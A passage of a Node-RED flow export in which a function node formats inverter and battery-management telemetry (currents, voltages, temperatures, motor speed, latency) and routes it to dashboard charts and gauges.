(A)\",\n    payload: msg.payload.INV_Phase_C_Current\n}\ntry {\n    INV_Phase_C_Current.payload = INV_Phase_C_Current.payload.toFixed(sigFigs)\n} catch { }\n\nvar INV_Phase_B_Current =\n{\n    topic: \"INV Phase B Current (A)\",\n    payload: msg.payload.INV_Phase_B_Current\n}\ntry {\n    INV_Phase_B_Current.payload = INV_Phase_B_Current.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_Phase_A_Current =\n{\n    topic: \"INV Phase A Current (A)\",\n    payload: msg.payload.INV_Phase_A_Current\n}\ntry {\n    INV_Phase_A_Current.payload = INV_Phase_A_Current.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_Motor_Speed =\n{\n    topic: \"INV Motor Speed\",\n    payload: msg.payload.INV_Motor_Speed\n}\ntry {\n    INV_Motor_Speed.payload = INV_Motor_Speed.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_Motor_Angle_Electrical =\n{\n    topic: \"INV Motor Angle Electrical (deg)\",\n    payload: msg.payload.INV_Motor_Angle_Electrical\n}\ntry {\n    INV_Motor_Angle_Electrical.payload = INV_Motor_Angle_Electrical.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_Motor_Temp =\n{\n    topic: \"INV Motor Temperature (ºC)\",\n    payload: msg.payload.INV_Motor_Temp\n}\ntry {\n    INV_Motor_Temp.payload = INV_Motor_Temp.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_Hot_Spot_Temp =\n{\n    topic: \"INV Hot Spot Temperature (ºC)\",\n    payload: msg.payload.INV_Hot_Spot_Temp\n}\ntry {\n    INV_Hot_Spot_Temp.payload = INV_Hot_Spot_Temp.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar inv_coolant_temperature =\n{\n    topic: \"INV Coolant Temperature\",\n    payload: msg.payload.inv_coolant_temperature\n}\ntry {\n    inv_coolant_temperature.payload = inv_coolant_temperature.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_RTD2_Temperature =\n{\n    topic: \"INV rtd2 Temperature (ºC)\",\n    payload: msg.payload.INV_RTD2_Temperature\n}\ntry {\n    INV_RTD2_Temperature.payload = INV_RTD2_Temperature.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_RTD1_Temperature =\n{\n    topic: \"INV rtd1 Temperature (ºC)\",\n    payload: msg.payload.INV_RTD1_Temperature\n}\ntry {\n    INV_RTD1_Temperature.payload = INV_RTD1_Temperature.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_Control_Board_Temp =\n{\n    topic: \"INV Control Board Temperature (ºC)\",\n    payload: msg.payload.INV_Control_Board_Temp\n}\ntry {\n    INV_Control_Board_Temp.payload = INV_Control_Board_Temp.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_Stall_Burst_Model_Temp =\n{\n    topic: \"INV Stall Burst Model Temperature (ºC)\",\n    payload: msg.payload.INV_Stall_Burst_Model_Temp\n}\ntry {\n    INV_Stall_Burst_Model_Temp.payload = INV_Stall_Burst_Model_Temp.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_Gate_Driver_Board_Temp =\n{\n    topic: \"INV Gate Driver Board Temperature (ºC)\",\n    payload: msg.payload.INV_Gate_Driver_Board_Temp\n}\ntry {\n    INV_Gate_Driver_Board_Temp.payload = INV_Gate_Driver_Board_Temp.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_Module_C_Temp =\n{\n    topic: \"INV Module C Temperature (ºC)\",\n    payload: msg.payload.INV_Module_C_Temp\n}\ntry {\n    INV_Module_C_Temp.payload = INV_Module_C_Temp.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_Module_B_Temp =\n{\n    topic: \"INV Module B Temperature (ºC)\",\n    payload: msg.payload.INV_Module_B_Temp\n}\ntry {\n    INV_Module_B_Temp.payload = INV_Module_B_Temp.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_Module_A_Temp =\n{\n    topic: \"INV Module A Temperature (ºC)\",\n    payload: msg.payload.INV_Module_A_Temp\n}\ntry {\n    INV_Module_A_Temp.payload = INV_Module_A_Temp.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_Diag_Ia =\n{\n    topic: \"INV Diag Ia A\",\n    payload: msg.payload.INV_Diag_Ia\n}\ntry {\n    INV_Diag_Ia.payload = INV_Diag_Ia.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_Diag_Ib =\n{\n    topic: \"INV Diag Ib (A)\",\n    payload: msg.payload.INV_Diag_Ib\n}\ntry {\n    INV_Diag_Ib.payload = INV_Diag_Ib.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_Diag_Ic =\n{\n    topic: \"INV Diag Ic (A)\",\n    payload: msg.payload.INV_Diag_Ic\n}\ntry {\n    INV_Diag_Ic.payload = INV_Diag_Ic.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_Diag_Vdc =\n{\n    topic: \"INV Diag Vdc (V)\",\n    payload: msg.payload.INV_Diag_Vdc\n}\ntry {\n    INV_Diag_Vdc.payload = INV_Diag_Vdc.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_Diag_Iq_cmd =\n{\n    topic: \"INV Diag Iq CMD (A)\",\n    payload: msg.payload.INV_Diag_Iq_cmd\n}\ntry {\n    INV_Diag_Iq_cmd.payload = INV_Diag_Iq_cmd.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_Diag_Id_cmd =\n{\n    topic: \"INV Diag Id CMD (A)\",\n    payload: msg.payload.INV_Diag_Id_cmd\n}\ntry {\n    INV_Diag_Id_cmd.payload = INV_Diag_Id_cmd.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_Diag_FW_Output =\n{\n    topic: \"INV Diag FW Output (A)\",\n    payload: msg.payload.INV_Diag_FW_Output\n}\ntry {\n    INV_Diag_FW_Output.payload = INV_Diag_FW_Output.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_Diag_Vq_Cmd =\n{\n    topic: \"INV Diag Vq CMD (V)\",\n    payload: msg.payload.INV_Diag_Vq_Cmd\n}\ntry {\n    INV_Diag_Vq_Cmd.payload = INV_Diag_Vq_Cmd.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_Diag_Vd_Cmd =\n{\n    topic: \"INV Diag Vd CMD (V)\",\n    payload: msg.payload.INV_Diag_Vd_Cmd\n}\ntry {\n    INV_Diag_Vd_Cmd.payload = INV_Diag_Vd_Cmd.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_Diag_Vqs_Cmd =\n{\n    topic: \"INV Diag Vqs CMD (V)\",\n    payload: msg.payload.INV_Diag_Vqs_Cmd\n}\ntry {\n    INV_Diag_Vqs_Cmd.payload = INV_Diag_Vqs_Cmd.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_Diag_PWM_Freq =\n{\n    topic: \"INV Diag PWM Freq\",\n    payload: msg.payload.INV_Diag_PWM_Freq\n}\ntry {\n    INV_Diag_PWM_Freq.payload = INV_Diag_PWM_Freq.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar BMS_Max_Discharge_Current =\n{\n    topic: \"BMS Max Discharge Current (A)\",\n    payload: msg.payload.BMS_Max_Discharge_Current\n}\ntry {\n    BMS_Max_Discharge_Current.payload = BMS_Max_Discharge_Current.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar BMS_Max_Charge_Current =\n{\n    topic: \"BMS Max Charge Current (A)\",\n    payload: msg.payload.BMS_Max_Charge_Current\n}\ntry {\n    BMS_Max_Charge_Current.payload = BMS_Max_Charge_Current.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_Fast_Torque_Command =\n{\n    topic: \"INV Fast Torque Command (N*m)\",\n    payload: msg.payload.INV_Fast_Torque_Command\n}\ntry {\n    INV_Fast_Torque_Command.payload = INV_Fast_Torque_Command.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_Fast_Torque_Feedback =\n{\n    topic: \"INV Fast Torque Feedback (N*m)\",\n    payload: msg.payload.INV_Fast_Torque_Feedback\n}\ntry {\n    INV_Fast_Torque_Feedback.payload = INV_Fast_Torque_Feedback.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_Fast_Motor_Speed =\n{\n    topic: \"INV Fast Motor Speed (rpm)\",\n    payload: msg.payload.INV_Fast_Motor_Speed\n}\ntry {\n    INV_Fast_Motor_Speed.payload = INV_Fast_Motor_Speed.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_Fast_DC_Bus_Voltage =\n{\n    topic: \"INV Fast DC Bus Voltage (V)\",\n    payload: msg.payload.INV_Fast_DC_Bus_Voltage\n}\ntry {\n    INV_Fast_DC_Bus_Voltage.payload = INV_Fast_DC_Bus_Voltage.payload.toFixed(sigFigs)\n} catch { }\n\nvar Latency =\n{\n    topic: \"Latency (s)\",\n    payload: msg.payload.Latency\n}\ntry {\n    Latency.payload = Latency.payload.toFixed(sigFigs)\n} catch { }\n\nvar Total_Latency =\n{\n    topic: \"Total Latency (s)\",\n    payload: (timestamp - msg.payload.Arduino_Time)\n}\ntry {\n    Total_Latency.payload = Total_Latency.payload / 1000\n    Total_Latency.payload = Total_Latency.payload.toFixed(sigFigs)\n} catch { }\n\nreturn [\n    INV_Ref_Voltage_12_0,\n    INV_Ref_Voltage_5_0,\n    INV_Ref_Voltage_2_5,\n    INV_Ref_Voltage_1_5,\n    INV_Iq,\n    INV_Id,\n    INV_Vq_ff,\n    INV_Vd_ff,\n    INV_VBC_Vq_Voltage,\n    INV_VAB_Vd_Voltage,\n    INV_Output_Voltage,\n    INV_DC_Bus_Voltage,\n    INV_DC_Bus_Current,\n    INV_Phase_C_Current,\n    INV_Phase_B_Current,\n    INV_Phase_A_Current,\n    INV_Motor_Speed,\n    INV_Motor_Angle_Electrical,\n    INV_Motor_Temp,\n    INV_Hot_Spot_Temp,\n    inv_coolant_temperature,\n    INV_RTD2_Temperature,\n    INV_RTD1_Temperature,\n    INV_Control_Board_Temp,\n    INV_Stall_Burst_Model_Temp,\n    INV_Gate_Driver_Board_Temp,\n    INV_Module_C_Temp,\n    INV_Module_B_Temp,\n    INV_Module_A_Temp,\n    INV_Diag_Ia,\n    INV_Diag_Ib,\n    INV_Diag_Ic,\n    INV_Diag_Vdc,\n    INV_Diag_Iq_cmd,\n    INV_Diag_Id_cmd,\n    INV_Diag_FW_Output,\n    INV_Diag_Vq_Cmd,\n    INV_Diag_Vd_Cmd,\n    INV_Diag_Vqs_Cmd,\n    INV_Diag_PWM_Freq,\n    BMS_Max_Discharge_Current,\n    BMS_Max_Charge_Current,\n    INV_Fast_Torque_Command,\n    INV_Fast_Torque_Feedback,\n    INV_Fast_Motor_Speed,\n    INV_Fast_DC_Bus_Voltage,\n    Latency,\n    Total_Latency\n];",
        "outputs": 48,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 560,
        "y": 400,
        "wires": [
            [
                "ee0b250d87f6e5dc"
            ],
            [
                "ee0b250d87f6e5dc"
            ],
            [
                "ee0b250d87f6e5dc"
            ],
            [
                "ee0b250d87f6e5dc"
            ],
            [
                "d6e7561d85bd11b6"
            ],
            [
                "d6e7561d85bd11b6"
            ],
            [
                "e5830f05dd4db39d"
            ],
            [
                "e5830f05dd4db39d"
            ],
            [
                "f49d99c6b0b02d77"
            ],
            [
                "f49d99c6b0b02d77"
            ],
            [
                "df772818309d0499"
            ],
            [
                "df772818309d0499"
            ],
            [
                "fe6b4a402ce856a1"
            ],
            [
                "b9c7ba040efde351"
            ],
            [
                "b9c7ba040efde351"
            ],
            [
                "b9c7ba040efde351"
            ],
            [
                "b9f24e1a1e8c3f28",
                "47c6f748f4e85402"
            ],
            [
                "87a044d28b25c583"
            ],
            [
                "054dd101e60dd310"
            ],
            [
                "054dd101e60dd310"
            ],
            [
                "054dd101e60dd310"
            ],
            [
                "e5570d33b861a9a3"
            ],
            [
                "e5570d33b861a9a3"
            ],
            [
                "eca90818fcfec8ba"
            ],
            [
                "df772818309d0499"
            ],
            [
                "eca90818fcfec8ba"
            ],
            [
                "1bcbe1efc015af9e"
            ],
            [
                "1bcbe1efc015af9e"
            ],
            [
                "1bcbe1efc015af9e"
            ],
            [
                "4f0eaf4ca2f9da7f"
            ],
            [
                "4f0eaf4ca2f9da7f"
            ],
            [
                "4f0eaf4ca2f9da7f"
            ],
            [
                "df772818309d0499"
            ],
            [
                "46e38c17f5ce0eaf"
            ],
            [
                "46e38c17f5ce0eaf"
            ],
            [
                "fe6b4a402ce856a1"
            ],
            [
                "d273f8164fbd84a6"
            ],
            [
                "d273f8164fbd84a6"
            ],
            [
                "df772818309d0499"
            ],
            [
                "d4d3ed9a1a436581"
            ],
            [
                "4ecafa0dd4a8b3d4"
            ],
            [
                "4ecafa0dd4a8b3d4"
            ],
            [
                "d32eece9a27aee39"
            ],
            [
                "d32eece9a27aee39"
            ],
            [
                "4504e0e644db03dd"
            ],
            [
                "df772818309d0499"
            ],
            [
                "29c5d3a848d1f0ef"
            ],
            [
                "182ae0642a6369b0"
            ]
        ]
    },
    {
        "id": "d6e7561d85bd11b6",
        "type": "ui_chart",
        "z": "4a2f2f6c3794d699",
        "name": "",
        "group": "0e1238d7f55a6974",
        "order": 4,
        "width": 8,
        "height": 6,
        "label": "Iq and Id Current",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#0081a6",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 830,
        "y": 60,
        "wires": [
            []
        ]
    },
    {
        "id": "e5830f05dd4db39d",
        "type": "ui_chart",
        "z": "4a2f2f6c3794d699",
        "name": "",
        "group": "b49fa523c2129f05",
        "order": 12,
        "width": 8,
        "height": 6,
        "label": "Feedforward Voltages",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#0081a6",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 840,
        "y": 100,
        "wires": [
            []
        ]
    },
    {
        "id": "f49d99c6b0b02d77",
        "type": "ui_chart",
        "z": "4a2f2f6c3794d699",
        "name": "",
        "group": "7389cb949baabe46",
        "order": 11,
        "width": 8,
        "height": 6,
        "label": "Voltage Between Phases",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#0081a6",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 850,
        "y": 140,
        "wires": [
            []
        ]
    },
    {
        "id": "b9c7ba040efde351",
        "type": "ui_chart",
        "z": "4a2f2f6c3794d699",
        "name": "",
        "group": "b49fa523c2129f05",
        "order": 9,
        "width": 8,
        "height": 6,
        "label": "Phase Current",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#0081a6",
            "#e87722",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1020,
        "y": 300,
        "wires": [
            []
        ]
    },
    {
        "id": "b9f24e1a1e8c3f28",
        "type": "ui_gauge",
        "z": "4a2f2f6c3794d699",
        "name": "",
        "group": "b49fa523c2129f05",
        "order": 1,
        "width": "8",
        "height": 6,
        "gtype": "gage",
        "title": "Motor Speed",
        "label": "rpm",
        "format": "{{value}}",
        "min": 0,
        "max": "32767",
        "colors": [
            "#00b500",
            "#e6e600",
            "#ca3838"
        ],
        "seg1": "",
        "seg2": "",
        "diff": false,
        "className": "",
        "x": 810,
        "y": 340,
        "wires": []
    },
    {
        "id": "054dd101e60dd310",
        "type": "ui_chart",
        "z": "4a2f2f6c3794d699",
        "name": "",
        "group": "7389cb949baabe46",
        "order": 9,
        "width": 8,
        "height": 6,
        "label": "Temperatures",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#0081a6",
            "#e87722",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 840,
        "y": 500,
        "wires": [
            []
        ]
    },
    {
        "id": "e5570d33b861a9a3",
        "type": "ui_chart",
        "z": "4a2f2f6c3794d699",
        "name": "",
        "group": "0e1238d7f55a6974",
        "order": 2,
        "width": 8,
        "height": 6,
        "label": "RTD Input Temperatures",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#0081a6",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 850,
        "y": 520,
        "wires": [
            []
        ]
    },
    {
        "id": "1bcbe1efc015af9e",
        "type": "ui_chart",
        "z": "4a2f2f6c3794d699",
        "name": "",
        "group": "3e5592e7984c84fe",
        "order": 2,
        "width": 8,
        "height": 6,
        "label": "Module Temperature",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#0081a6",
            "#e87722",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 840,
        "y": 600,
        "wires": [
            []
        ]
    },
    {
        "id": "4f0eaf4ca2f9da7f",
        "type": "ui_chart",
        "z": "4a2f2f6c3794d699",
        "name": "",
        "group": "b49fa523c2129f05",
        "order": 8,
        "width": 8,
        "height": 6,
        "label": "Diagnostic Phase Currents",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#0081a6",
            "#e87722",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 860,
        "y": 680,
        "wires": [
            []
        ]
    },
    {
        "id": "46e38c17f5ce0eaf",
        "type": "ui_chart",
        "z": "4a2f2f6c3794d699",
        "name": "",
        "group": "3e5592e7984c84fe",
        "order": 3,
        "width": 8,
        "height": 6,
        "label": "Command Currents",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#0081a6",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 830,
        "y": 720,
        "wires": [
            []
        ]
    },
    {
        "id": "d273f8164fbd84a6",
        "type": "ui_chart",
        "z": "4a2f2f6c3794d699",
        "name": "",
        "group": "7389cb949baabe46",
        "order": 8,
        "width": 8,
        "height": 6,
        "label": "Command Voltages",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#0081a6",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 830,
        "y": 800,
        "wires": [
            []
        ]
    },
    {
        "id": "4ecafa0dd4a8b3d4",
        "type": "ui_chart",
        "z": "4a2f2f6c3794d699",
        "name": "",
        "group": "0e1238d7f55a6974",
        "order": 5,
        "width": 8,
        "height": 6,
        "label": "Max BMS Current",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 830,
        "y": 920,
        "wires": [
            []
        ]
    },
    {
        "id": "4504e0e644db03dd",
        "type": "ui_gauge",
        "z": "4a2f2f6c3794d699",
        "name": "",
        "group": "7389cb949baabe46",
        "order": 1,
        "width": "8",
        "height": 6,
        "gtype": "gage",
        "title": "Motor Speed Max",
        "label": "rpm",
        "format": "{{value}}",
        "min": 0,
        "max": "32767",
        "colors": [
            "#00b500",
            "#e6e600",
            "#ca3838"
        ],
        "seg1": "",
        "seg2": "",
        "diff": false,
        "className": "",
        "x": 830,
        "y": 960,
        "wires": []
    },
    {
        "id": "eca90818fcfec8ba",
        "type": "ui_chart",
        "z": "4a2f2f6c3794d699",
        "name": "",
        "group": "b49fa523c2129f05",
        "order": 11,
        "width": 8,
        "height": 6,
        "label": "Board Temeperatures",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#0081a6",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1280,
        "y": 500,
        "wires": [
            []
        ]
    },
    {
        "id": "87a044d28b25c583",
        "type": "ui_chart",
        "z": "4a2f2f6c3794d699",
        "name": "",
        "group": "7389cb949baabe46",
        "order": 10,
        "width": 8,
        "height": 6,
        "label": "Motor Angle (Electrical)",
        "chartType": "line",
        "legend": "false",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 850,
        "y": 440,
        "wires": [
            []
        ]
    },
    {
        "id": "df772818309d0499",
        "type": "ui_chart",
        "z": "4a2f2f6c3794d699",
        "name": "",
        "group": "3e5592e7984c84fe",
        "order": 4,
        "width": 8,
        "height": 6,
        "label": "Voltages (Other)",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#0081a6",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1080,
        "y": 260,
        "wires": [
            []
        ]
    },
    {
        "id": "fe6b4a402ce856a1",
        "type": "ui_chart",
        "z": "4a2f2f6c3794d699",
        "name": "",
        "group": "3e5592e7984c84fe",
        "order": 5,
        "width": 8,
        "height": 6,
        "label": "Currents (Others)",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#0081a6",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 830,
        "y": 220,
        "wires": [
            []
        ]
    },
    {
        "id": "47c6f748f4e85402",
        "type": "ui_chart",
        "z": "4a2f2f6c3794d699",
        "name": "",
        "group": "3e5592e7984c84fe",
        "order": 1,
        "width": 8,
        "height": 6,
        "label": "Motor Speed",
        "chartType": "line",
        "legend": "false",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 810,
        "y": 380,
        "wires": [
            []
        ]
    },
    {
        "id": "d4d3ed9a1a436581",
        "type": "ui_chart",
        "z": "4a2f2f6c3794d699",
        "name": "",
        "group": "3e5592e7984c84fe",
        "order": 6,
        "width": 8,
        "height": 6,
        "label": "PWM Frequency",
        "chartType": "line",
        "legend": "false",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 830,
        "y": 840,
        "wires": [
            []
        ]
    },
    {
        "id": "d32eece9a27aee39",
        "type": "ui_chart",
        "z": "4a2f2f6c3794d699",
        "name": "",
        "group": "0e1238d7f55a6974",
        "order": 1,
        "width": 8,
        "height": 6,
        "label": "Torques",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#0081a6",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1020,
        "y": 880,
        "wires": [
            []
        ]
    },
    {
        "id": "29c5d3a848d1f0ef",
        "type": "ui_text",
        "z": "4a2f2f6c3794d699",
        "group": "2a5cf11e0b167099",
        "order": 1,
        "width": 4,
        "height": 1,
        "name": "",
        "label": "Server Latency (s):",
        "format": "{{msg.payload}}",
